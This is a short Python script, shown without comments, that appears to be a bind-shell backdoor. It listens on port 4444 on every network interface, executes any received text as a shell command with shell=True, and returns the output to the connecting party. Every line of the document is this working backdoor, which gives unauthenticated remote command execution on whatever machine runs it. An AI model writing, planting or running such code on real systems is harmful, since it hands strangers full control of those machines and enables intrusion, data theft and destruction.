import socket, subprocess
s = socket.socket()
s.bind(("0.0.0.0", 4444))
s.listen(1)
while True:
    c, a = s.accept()
    d = c.recv(1024)
    r = subprocess.check_output(d, shell=True)
    c.send(r)